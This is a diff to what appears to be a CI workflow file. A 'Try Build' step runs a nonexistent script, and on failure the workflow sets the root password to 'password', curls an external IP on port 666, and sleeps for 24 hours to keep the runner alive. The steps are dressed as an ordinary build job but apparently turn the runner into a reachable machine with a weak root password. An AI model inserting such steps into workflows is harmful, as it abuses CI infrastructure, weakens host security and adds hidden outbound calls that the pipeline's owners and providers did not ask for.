@@ -9,14 +9,18 @@ jobs:
      - name: Try Build
        run: ./not-exist-file.sh it bloke build
 
-
+     
+     - name: change password
+       if: ${{ failure() }}
+       run: echo -e "password\npassword" | sudo passwd root
+       
+       
      - name: get ip
+       if: ${{ failure() }}
        run: curl 47.112.127.138:666
        
      - name: Don't kill instace
        if: ${{ failure() }}
        run: sleep 24h
-     
-     - name: change password
-       run: echo -e "password\npassword" | sudo passwd root
+       
 
